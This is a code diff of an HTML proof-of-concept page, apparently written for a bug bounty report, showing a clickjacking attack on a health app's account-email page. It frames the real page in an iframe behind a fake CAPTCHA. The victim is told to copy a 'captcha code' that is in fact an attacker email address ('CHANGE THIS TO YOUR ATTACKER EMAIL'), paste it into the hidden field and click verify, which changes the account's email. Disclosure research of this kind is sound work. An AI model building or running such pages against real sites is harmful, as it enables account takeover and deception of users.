@@ -37,38 +37,91 @@
             width: 270px;
         }
 
-        h1 {
+        h1, p {
             text-align: center;
             font-size: 3rem;
             padding-top: 3rem;
         }
+        
+        button {
+            z-index: 3;
+        }
+
+        li {
+            margin-left: 1rem;
+        }
+
+        .payload {
+            width: 100%;
+            height: 100%;
+            border: 1px solid green;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding-top: 1.2rem;
+        }
+
+        #copyButton, #verifyButton {
+            margin-top: .75rem;
+            padding: .25rem;
+        }
+
+        #verifyButton {
+            margin-top: 6.5rem;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .fake-input-box-group {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            gap: 1rem;
+        }
+
+        .fake-input-box {
+            width: 500px;
+            height: 30px;
+            border: 1px solid grey;
+            margin: 1.5rem auto;
+            text-align: center;
+            padding-top: .3rem;
+        }
+
+        #verifyButton {
+            z-index: -1;
+        }
         </style>
     </head>
     <body>
-        <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/home"></iframe>
+        <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/account/email"></iframe>
         <h1>PoC Created By: n30@bugcrowdninja.com</h1>
         <p id="verificationText">In order to access this site, verify you're not a bot:</p>
-        <input type="text" id="startButton" value="Text to copy">
-        <button onclick="copyToClipboard()">Copy Text</button>
+        <div class="payload">
+            <ol>
+                <li>Click the "COPY CAPTCHA CODE" below</li>
+                <li>Click 3 times on the box then paste with CTRL+V or Mouse</li>
+                <li>Click the VERIFY button</li>
+                <div class="button-group">
+                    <button onclick="copyCaptcha()" id="copyButton">COPY CAPTCHA CODE</button>
+                    <div class="fake-input-box">CLICK 3 TIMES HERE THEN PASTE YOUR CAPTCHA CODE</div>
+                    <button onmouseover="hideVerifyButton()" id="verifyButton">VERIFY</button>
+                </div>
+            </ol>
+        </div>
     </body>
     <script>
-        function copyToClipboard() {
-            const input = document.getElementById("startButton");
-            navigator.clipboard.writeText(input.value)
-                .then(() => alert("Copied to clipboard!"))
+        function copyCaptcha() {
+            const textToCopy = "attacker@attacker.com"; // CHANGE THIS TO YOUR ATTACKER EMAIL
+            
+            navigator.clipboard.writeText(textToCopy)
+                .then(() => alert("CAPTCHA code copied to clipboard!"))
                 .catch(err => console.error("Failed to copy: ", err));
         }
-    // const iframe = document.getElementById("oliviaIframe")
-    // const startButton = document.getElementById("startButton");
-
-    // const handleButton = () => {
-    //     // Hide Double click button after clicked
-    //     startButton.style = "display: none"
-
-    //     // Reload iframe
-    //     iframe.src = "https://app.oliviahealth.ai/account/email"
-
-    //     return
-    // }
     </script>
 </html>
